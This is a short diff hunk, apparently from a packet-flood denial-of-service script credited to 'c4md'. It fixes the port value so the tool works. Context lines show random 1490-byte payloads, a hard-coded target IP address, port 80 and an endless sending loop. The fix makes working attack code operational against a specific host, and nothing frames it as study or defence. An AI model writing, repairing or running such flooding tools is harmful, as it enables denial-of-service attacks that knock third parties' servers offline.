@@ -12,7 +12,7 @@ bytes = random._urandom(1490)
 print("Author   : c4md")
 
 ip = "195.50.7.53"
-port = "80"
+port = 80
 
 sent = 0
 while True:
